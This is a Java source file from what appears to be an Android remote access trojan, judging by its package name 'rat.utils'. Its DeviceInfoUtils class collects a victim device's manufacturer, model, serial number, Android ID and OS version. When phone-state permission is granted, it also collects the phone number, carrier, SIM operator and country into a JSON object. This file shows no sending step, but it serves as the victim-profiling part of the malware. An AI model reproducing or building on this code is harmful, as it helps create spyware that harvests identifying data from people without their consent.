package com.fly0rakoon.rat.utils;

import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.telephony.TelephonyManager;
import android.provider.Settings;

import org.json.JSONObject;

public class DeviceInfoUtils {
    
    public static JSONObject collectDeviceInfo(Context context) {
        JSONObject deviceInfo = new JSONObject();
        
        try {
            deviceInfo.put("manufacturer", Build.MANUFACTURER);
            deviceInfo.put("model", Build.MODEL);
            deviceInfo.put("product", Build.PRODUCT);
            deviceInfo.put("device", Build.DEVICE);
            deviceInfo.put("brand", Build.BRAND);
            deviceInfo.put("board", Build.BOARD);
            deviceInfo.put("hardware", Build.HARDWARE);
            deviceInfo.put("serial", Build.SERIAL);
            deviceInfo.put("android_version", Build.VERSION.RELEASE);
            deviceInfo.put("sdk_version", Build.VERSION.SDK_INT);
            
            // Get Android ID
            String androidId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
            deviceInfo.put("android_id", androidId);
            
            // Get telephony info if available
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (telephonyManager != null) {
                if (checkPermission(context, android.Manifest.permission.READ_PHONE_STATE)) {
                    deviceInfo.put("phone_number", telephonyManager.getLine1Number());
                    deviceInfo.put("network_operator", telephonyManager.getNetworkOperatorName());
                    deviceInfo.put("sim_operator", telephonyManager.getSimOperatorName());
                    deviceInfo.put("country_iso", telephonyManager.getNetworkCountryIso());
                }
            }
            
        } catch (Exception e) {
            e.printStackTrace();
        }
        
        return deviceInfo;
    }
    
    private static boolean checkPermission(Context context, String permission) {
        return context.checkCallingOrSelfPermission(permission) == PackageManager.PERMISSION_GRANTED;
    }
}
